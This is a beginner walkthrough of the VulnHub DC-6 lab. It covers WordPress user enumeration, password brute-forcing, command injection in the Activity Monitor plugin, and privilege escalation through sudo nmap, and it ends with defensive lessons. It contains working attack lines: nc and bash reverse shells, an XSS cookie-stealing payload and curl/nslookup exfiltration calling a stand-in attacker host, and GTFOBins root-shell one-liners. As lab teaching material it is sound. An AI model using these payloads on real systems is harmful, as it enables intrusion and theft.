# DC: 6 — VulnHub Walkthrough (Beginner to Intermediate)

DC: 6 is the sixth machine in the DCAU "DC" series. It is a purposely broken Debian
machine running **WordPress** on the hostname `wordy`. This lab is a great introduction
to CMS exploitation: enumerate WordPress, crack a weak user password, abuse a vulnerable
plugin for code execution, then climb the privilege ladder through password reuse and a
misconfigured `sudo` rule. This document explains every step as if you are new to hacking.

| Field | Value |
|---|---|
| Machine | DC: 6 |
| Difficulty | Beginner / Intermediate |
| Author | DCAU (http://www.five86.com/dc-6.html) |
| Released | 26 April 2019 |
| VulnHub Entry | https://vulnhub.com/entry/dc-6,315/ |
| Download | https://vulnhub.com/entry/dc-6,315/#download |
| Attacker | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| Target OS | Debian Linux 64-bit (VirtualBox) |

> **Legal note:** Only attack a machine you own or have explicit permission to test.
> This VM is designed to be broken — never point these tools at systems you do not own.

## 0. What you will learn

By the end of this lab you will have practised:

- **Host discovery and port scanning** — finding the target and its services with `nmap`.
- **Content Management System (CMS) enumeration** — using `wpscan` against WordPress.
- **Username enumeration** — listing valid WordPress users.
- **Password cracking** — building a targeted wordlist and brute-forcing the login.
- **Plugin exploitation** — abusing a vulnerable WordPress plugin for command execution.
- **Horizontal privilege escalation** — reusing credentials found on disk.
- **Vertical privilege escalation** — abusing a `sudo` rule on `nmap` via GTFOBins.
- **Blue-team thinking** — why each mistake is dangerous and how to prevent it.

The core idea: WordPress leaks usernames by default, weak passwords fall to a wordlist,
a plugin trusts admin input too much, and one careless `sudo` rule finishes the job.

## 1. Reconnaissance — finding the target

Confirm your attacker IP is `192.168.56.10`.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

Sweep the subnet to find the target.


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
nmap -sn 192.168.56.0/24
```

```text
Nmap scan report for 192.168.56.101
Host is up (0.00031s latency).
```

The target is `192.168.56.101`. (Addresses vary by build.)

![Ping sweep finding the target host](images/01-nmap-sweep.png)

> **Why it works:** `nmap -sn` sends lightweight probes and reports which addresses are
> alive, so you can discover the target's IP before you scan its ports.


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

Scan all ports and detect service versions.

```bash
nmap -sC -sV -p- 192.168.56.101 -oN nmap-full.txt
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 (Debian)
Service Info: OS: Linux
```

SSH on 22 and a web server on 80. (Version numbers vary by build.)

![Full nmap scan of DC-6](images/02-nmap.png)

The site is WordPress and the box calls itself `wordy`. Add a hosts entry so you can use
the name, then confirm the tech.

```bash
echo "192.168.56.101 wordy" | sudo tee -a /etc/hosts
curl -s http://wordy/ | grep -iE "wp-content|generator"
```

```text
<meta name="generator" content="WordPress 5.1.1" />
<link rel='stylesheet' href='http://wordy/wp-content/themes/...' />
```

The site reveals WordPress and a theme listing some author names.

![Browsing the WordPress site](images/03-wordpress.png)

### 2.1 Enumerate WordPress users

`wpscan` automates WordPress reconnaissance. The `-e u` flag enumerates users.


> ### 📖 Concept — How does WordPress leak usernames?
>
> WordPress builds author archive URLs from a **numeric user ID**:
>
> ```text
> /wordpress/?author=1   →  301 → /wordpress/author/michael/
> /wordpress/?author=2   →  301 → /wordpress/author/steven/
> ```
>
> The ID counts up from 1 and the redirect target contains the **username**.
> `wpscan -e u` just loops the IDs until they stop resolving. Watch it happen by hand
> in a browser — that is worth more than reading about it.
>
> **The `-e` flag chooses what to enumerate:** `u` users · `p` **plugins** (the most
> common WordPress compromise vector) · `t` themes · `vp`/`vt` only *vulnerable*
> plugins/themes · `cb` config backups (`wp-config.php.bak` — a jackpot) · `dbe`
> database exports.
>
> wpscan also labels *how* it found things, and the labels matter: **Passive
> Detection** means inferred from data the site publishes anyway (RSS, bylines) — the
> site does not notice. **Aggressive Detection** means it actively probed (brute
> forcing author IDs, submitting bad logins to read error messages) — which writes
> log entries.
>
> **Why usernames matter:** they are half of every credential pair. With two known
> usernames you can attack `wp-login.php` *and* SSH directly instead of guessing both
> halves.
>
> **Deep dive:** [CONCEPTS §9.2 — WordPress / wpscan](../../docs/CONCEPTS.md#92-wordpress--wpscan)

```bash
wpscan --url http://wordy/ -e u --disable-tls-checks
```

```text
[i] User(s) Identified:
[+] admin
[+] mark
[+] graham
[+] sarah
[+] jens
```

Five valid usernames. (The exact list varies slightly by build.)

![wpscan user enumeration](images/04-wpscan-users.png)

> **Why it works:** WordPress exposes author information through REST endpoints and
> author archives. `wpscan` collects these leaks into a clean list of real usernames —
> the first half of a login attack.

### 2.2 Identify the WordPress version and plugins

```bash
wpscan --url http://wordy/ -e ap
```

```text
[+] WordPress version 5.1.1 identified
[+] Plugins: activity-monitor
```

The plugin **Activity Monitor** is installed. Remember this — it becomes our way in.

## 3. Foothold

### 3.1 Build a targeted wordlist and crack the login

The author of this box hinted that the passwords contain the string `k01`. Rather than
throwing all of `rockyou.txt` at the login, filter it first — this is faster and more
reliable.


> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)

```bash
cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
wc -l passwords.txt
```

```text
1 passwords.txt
```

Brute-force the WordPress login with `wpscan` and the small list.

```bash
wpscan --url http://wordy/ -U mark -P passwords.txt
```

```text
[SUCCESS] - mark / helpdesk01
```

Credentials: **mark : helpdesk01**. (The winning password depends on the wordlist on your
build; `helpdesk01` is the classic answer.)

> **Why it works:** Filtering a huge wordlist down to likely candidates makes each attempt
> cheap. A single successful match reveals a weak, human-guessable password.

### 3.2 Log in and find the vulnerable plugin

Log in at `http://wordy/wp-login.php` with `mark : helpdesk01`. In the dashboard, the
**Activity Monitor** plugin is visible. It lets an administrator "ping" or look up a host
by entering an address — and it passes that input to a shell command unsafely.

Look up a public exploit for the plugin:


> ### 📖 Concept — CVEs, Exploit-DB and searchsploit
>
> **The identifiers:**
> - **CVE** — a stable ID for one vulnerability. `CVE-2014-6271` is Shellshock.
>   Look it up at <https://nvd.nist.gov/vuln/search>.
> - **CVSS** — a 0.0–10.0 severity score. Useful for *prioritising*, **not** for
>   deciding exploitability: a CVSS 9.8 needing physical access is less useful to you
>   than a 5.3 reachable over HTTP.
> - **EDB ID** — a numbered public proof-of-concept on Exploit-DB.
>
> **`searchsploit`** is a **local, offline** search of the Exploit-DB archive shipped
> with Kali. Offline matters — it works mid-engagement with no internet.
>
> ```bash
> searchsploit wordpress 4.8            # search titles and paths
> searchsploit -t apache 2.4            # titles only — far fewer false positives
> searchsploit -m php/webapps/37596.py  # mirror (copy) it into your cwd
> searchsploit -x php/webapps/41006.txt # examine (print) it
> searchsploit -p 41006                 # show the full path
> searchsploit --update                 # refresh the local database
> ```
>
> > **Read the exploit before you run it.** Non-negotiable, for three reasons:
> > (1) many Exploit-DB entries are *unverified*, and some are outright malicious to
> > the person running them; (2) you need to know which parameters to change
> > (`RHOST`, `LHOST`, target path, memory offsets); (3) understanding it is the
> > entire point of the exercise.
>
> The workflow that actually works: get an exact **version** from `nmap -sV` or the
> app's own footer, search it, read the top candidate, then reproduce the request
> **by hand with `curl`** so you know what exploitation looked like. Only then decide
> whether the automated module is worth it.
>
> **Deep dive:** [CONCEPTS §11 — Finding and using exploits](../../docs/CONCEPTS.md#11-finding-and-using-exploits)

```bash
searchsploit activity monitor
```


> ### 📖 Concept — XSS and CSRF: two attacks that sound alike and are not
>
> **XSS** (Cross-Site Scripting) injects JavaScript that runs **in another user's
> browser**, with their session and their privileges. Three flavours:
>
> | Type | Where the payload lives | Danger |
> | --- | --- | --- |
> | **Reflected** | In the URL, echoed straight back | Victim must click your link |
> | **Stored** | Saved server-side (a comment, a profile field) | Runs for **every** visitor — much worse |
> | **DOM-based** | Never reaches the server; client-side JS inserts it unsafely | Invisible to server logs |
>
> ```html
> <script>alert(document.domain)</script>
> <script>fetch('http://attacker/?c='+document.cookie)</script>
> "><img src=x onerror=alert(1)>      <!-- breaks out of an HTML attribute -->
> javascript:alert(1)                 <!-- inside an href -->
> ```
>
> **Why XSS is equivalent to account takeover:** stealing an administrator's session
> cookie needs no password. And on a CMS, an admin account is remote code execution,
> because admins can edit theme and template files.
>
> **CSRF** (Cross-Site Request Forgery) is different: it makes a *logged-in* user
> perform an action they did not intend, by exploiting the fact that the browser
> attaches session cookies automatically.
>
> ```html
> <form method="post" action="http://target/wp-admin/admin-ajax.php">
>   <input type="hidden" name="username" value="admin">
>   <input type="hidden" name="action"   value="loginGuestFacebook">
>   <input type="submit" value="Login">
> </form>
> ```
>
> **The defence is a nonce** — a per-session, unpredictable token bound to the form,
> which an attacker's page cannot know. Its absence is the vulnerability.
>
> > CSRF can be far worse than "trick a user into clicking." In WP Support Plus 7.1.3
> > (Exploit-DB **41006**) the vulnerable action called WordPress's
> > `wp_set_auth_cookie()` on a username taken straight from the POST body **with no
> > password check at all** — so an *anonymous* attacker could log in as any user.
>
> **Deep dive:** [CONCEPTS §13.6 — XSS](../../docs/CONCEPTS.md#136-cross-site-scripting-xss) ·
> [§13.7 — CSRF](../../docs/CONCEPTS.md#137-csrf)

```text
Activity Monitor 5.0.0 - Cross-Site Request Forgery   | php/webapps/45274.html
```

![Dashboard showing the Activity Monitor plugin](images/05-plugin.png)

> **Why it works:** Plugins are third-party code that often lags behind on security.
> An admin-privileged user (like `mark`) can reach plugin features that execute system
> commands. Any input reaching a shell is command injection waiting to happen.

### 3.3 Command execution and a reverse shell

Start a listener on Kali.


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
rlwrap nc -lvnp 9999
```

In the Activity Monitor page, enter a host value that breaks out of the intended command
and calls back to you:

```text
127.0.0.1; nc -e /bin/sh 192.168.56.10 9999
```

```text
listening on [any] 9999 ...
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 44916
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrade the dumb shell to a full TTY:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

![Reverse shell as www-data](images/06-reverse-shell.png)

> **Why it works:** The plugin builds a command like `ping <host>` from your input. The
> semicolon `;` ends the intended command and starts a new one — your reverse shell. The
> target connects *out* to you, which slips past inbound firewalls.


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

### 4.1 Horizontal move: find a password on disk

Look in `mark`'s home directory for leftover notes.

```bash
cat /home/mark/stuff/things-to-do.txt
```

```text
Things to do:
- Set a password for graham
- graham's password is GSo7isUM1D4
```

Credentials: **graham : GSo7isUM1D4**.

```bash
su graham
```

```text
graham@dc-6:/home/www-data$
```

> **Why it works:** People leave passwords in notes, scripts and config files. Reading
> the files a compromised user can access frequently yields another user's credentials —
> this is "horizontal" movement (sideways, not up).

### 4.2 Move to `jens` via a backup script

Check what `graham` is allowed to run as root and as other users.


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
sudo -l
```

```text
User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
```

`graham` can run `/home/jens/backups.sh` as the user `jens`. If the script is writable
(permissions vary by build), append a shell command to it, then run the script as `jens`.

```bash
ls -la /home/jens/backups.sh
echo "/bin/bash" >> /home/jens/backups.sh
sudo -u jens /home/jens/backups.sh
```

```text
jens@dc-6:/home/graham$
```

> **Why it works:** `sudo -u jens ...` runs the script with `jens`'s identity. If we can
> change what the script does, we control the commands that run as `jens`. A script you
> are allowed to run is only as safe as its file permissions.

### 4.3 Move to root via `sudo nmap`

Now that we are `jens`, check `jens`'s sudo rights.

```bash
sudo -l
```

```text
User jens may run the following commands on dc-6:
    (root) NOPASSWD: /usr/bin/nmap
```

`nmap` can execute NSE Lua scripts. Running an attacker-supplied script as root lets us
run shell commands. This is the GTFOBins `nmap` technique.


> ### 📖 Concept — Command injection
>
> The application passes your input to a shell:
>
> ```php
> system("ping -c 4 " . $_GET['host']);
> ```
>
> Break out with a shell **metacharacter** and append your own command:
>
> | Payload | Effect |
> | --- | --- |
> | `; id` | Run sequentially, regardless |
> | `\| id` | Pipe — run next |
> | `\|\| id` | Run only if the first **failed** |
> | `&& id` | Run only if the first **succeeded** |
> | `` `id` `` | Command substitution |
> | `$(id)` | Command substitution — preferred, nestable |
> | `%0a id` | A URL-encoded **newline** — works when `;` and `\|` are filtered |
>
> **When output comes back**, you are done: `<host>;id` prints the result.
>
> **When it does not** ("blind" injection), exfiltrate out-of-band:
>
> ```bash
> $(curl http://attacker/$(whoami))        # data in the URL of a request YOU receive
> $(nslookup $(whoami).attacker.com)       # data in DNS — survives most egress rules
> ; sleep 10                               # a pure timing oracle, needs no network at all
> ```
>
> Run your listener first (`nc -lvnp 80`, or `python3 -m http.server`) and **watch its
> log** — a request arriving with the hostname embedded is your proof, and the log also
> tells you which payload variant the filter allowed through.
>
> **If characters are stripped**, find out exactly what survives. Submit `;|&$\`(){}[]<>`
> as a single string and see which ones come back. Filters are usually a `str_replace`
> of a short list, and almost always miss something — commonly newline, or a doubled
> character (`;;` collapsing to `;` after one removal pass).
>
> **Deep dive:** [CONCEPTS §13.4 — Command injection](../../docs/CONCEPTS.md#134-command-injection)

```bash
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
```

```text
root@dc-6:/home/jens# id
uid=0(root) gid=0(root) groups=0(root)
```

![Root shell via sudo nmap](images/07-root-nmap.png)

> **Why it works:** `sudo` runs `nmap` as root, not our script. But `nmap` loads our Lua
> file with `--script` and executes it inside a root process, where its `os.execute`
> spawns a root shell. Any powerful binary granted via `sudo` can often be repurposed —
> see GTFOBins for hundreds of examples.

### 4.4 Read the flag

```bash
cd /root
ls
cat theflag.txt
```

```text
... the flag contents ...
```

![Root shell and flag](images/08-root-flag.png)

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact | Fix |
|---|---|---|---|---|
| 1 | Username enumeration | WordPress REST/author archives | Real user list for password attacks | Disable user enumeration; restrict REST API author data |
| 2 | Weak passwords | `mark:helpdesk01` | WordPress admin access | Strong password policy; MFA; login rate-limiting |
| 3 | Vulnerable plugin (command injection) | "Activity Monitor" plugin | Remote code execution as `www-data` | Remove unused plugins; keep plugins patched; never pass input to a shell |
| 4 | Plaintext credentials on disk | `/home/mark/stuff/things-to-do.txt` | Account takeover of `graham` | Never store secrets in plaintext; rotate passwords |
| 5 | Writable script run via sudo | `/home/jens/backups.sh` as `jens` | Privilege change to `jens` | Restrict script permissions; audit `sudo` rules |
| 6 | Powerful binary via sudo | `(root) NOPASSWD: /usr/bin/nmap` | Root shell | Never grant sudo to general-purpose tools; use narrow wrappers |

## 6. Defensive lessons (blue team)

- **Harden WordPress.** Disable XML-RPC, block author enumeration, keep core, themes and
  plugins fully patched, and remove plugins you do not use.
- **Enforce real authentication.** Strong unique passwords, MFA, and lockouts after a few
  failed attempts stop wordlist attacks cold.
- **Keep secrets out of files.** Notes, backups and scripts must never hold plaintext
  passwords. Use a secrets manager and rotate on any suspicion of exposure.
- **Audit `sudo` relentlessly.** `sudo -l` output is a roadmap for attackers. Grant only
  the narrowest command necessary, and never general-purpose tools like `nmap`, `find`,
  `vim`, or `bash`.
- **Watch for outbound callbacks.** The reverse shell is the target connecting to you.
  Egress filtering and alerting on unexpected outbound connections catch this stage.
- **Least privilege for the web user.** `www-data` should not be able to read other users'
  home directories or execute privileged tools.

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry — https://vulnhub.com/entry/dc-6,315/
- DCAU series home — http://www.five86.com/dc-6.html
- WPScan documentation — https://github.com/wpscanteam/wpscan
- Activity Monitor plugin exploit (EDB 45274) — https://www.exploit-db.com/exploits/45274
- GTFOBins — `nmap` privilege escalation — https://gtfobins.github.io/gtfobins/nmap/
- OWASP WordPress security — https://owasp.org/www-project-web-security-testing-guide/
- Exploit-DB (general) — https://www.exploit-db.com/
- HackTricks WordPress — https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress

## 8. Screenshot checklist

Capture these as you go so your write-up is verifiable:

- [ ] `images/01-nmap-sweep.png` — ping sweep finding `192.168.56.101`
- [ ] `images/02-nmap.png` — full nmap scan (ports 22 and 80)
- [ ] `images/03-wordpress.png` — the WordPress site on `wordy`
- [ ] `images/04-wpscan-users.png` — `wpscan` user enumeration (admin, mark, graham, sarah, jens)
- [ ] `images/05-plugin.png` — dashboard showing the Activity Monitor plugin
- [ ] `images/06-reverse-shell.png` — `www-data` reverse shell
- [ ] `images/07-root-nmap.png` — root shell via `sudo nmap`
- [ ] `images/08-root-flag.png` — root shell and `theflag.txt` contents
